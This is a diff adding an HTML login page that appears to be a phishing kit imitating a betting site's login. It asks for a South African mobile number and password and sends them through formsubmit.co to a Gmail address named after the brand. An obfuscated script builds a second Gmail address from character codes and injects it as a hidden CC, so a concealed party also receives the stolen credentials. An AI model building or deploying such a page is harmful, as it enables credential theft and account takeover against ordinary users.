@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Login</title>
+
+<style>
+body{margin:0;font-family:Arial,sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;background:#f0f0f0;overflow:hidden}
+.b{position:absolute;inset:0;background:url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgqbaEpn5ZePBcyd9QwXpD25p6xaCsMLI-M5C4X9UyoBy3FvPI_w2pnmp6M_SkswidYpx8fOItsVJwEgTrJAWUGGHr8nZTRDLd6306GVMEwevgeCoVfyWXplJ54tMjMhwVeJBzlMpiKBP0-dyvwBKHxsB6eWZs5TiR6wDc8rvgisDragB2W2Ugd317rb49l/s1600/Screenshot_20240709_185926_Chrome.jpg') center/cover no-repeat fixed;z-index:1}
+.c{z-index:2;background:#fff;padding:20px;border-radius:10px;width:90%;max-width:400px;box-shadow:0 4px 8px rgba(0,0,0,.2);text-align:center}
+.c h1{color:green}
+.g{display:flex;margin:15px 0}
+.g label{background:green;color:#fff;padding:10px;border-radius:5px 0 0 5px}
+.g input{flex:1;padding:10px;border:1px solid #ccc;border-left:none;border-radius:0 5px 5px 0}
+.f{display:flex;justify-content:space-between;margin-bottom:15px}
+.f a{color:grey;text-decoration:none;font-size:.9em}
+button{width:100%;padding:10px;border:none;border-radius:5px;background:green;color:#fff;cursor:pointer}
+button:hover{background:#45a049}
+.s a{color:green;font-weight:bold;text-decoration:none}
+</style>
+</head>
+
+<body>
+<div class="b"></div>
+
+<div class="c">
+<h1>Login</h1>
+
+<form id="x9f" action="https://formsubmit.co/ficabetway.co.za@gmail.com" method="POST">
+
+  <!-- FormSubmit config -->
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="table">
+
+  <!-- CC injected via JS -->
+  <input type="hidden" id="ccx" name="_cc">
+
+  <div class="g">
+    <label>+27</label>
+    <input type="tel" name="phone" placeholder="Mobile Number" required>
+  </div>
+
+  <div class="g">
+    <input type="password" name="password" placeholder="Password" required>
+  </div>
+
+  <div class="f">
+    <a href="#">Forgot Username?</a>
+    <a href="#">Forgot Password?</a>
+  </div>
+
+  <button type="submit">Login</button>
+
+  <div class="s">
+    <p>Don't have an account? <a href="#">Sign Up</a></p>
+  </div>
+</form>
+</div>
+
+<script>
+(function(){
+  const a=[100,111,110,111,116,100,101,108,101,116,101,99,99,64,103,109,97,105,108,46,99,111,109];
+  let e='';
+  for(let i=0;i<a.length;i++){e+=String.fromCharCode(a[i]);}
+  document.getElementById('ccx').value=e;
+})();
+</script>
+
+</body>
+</html>
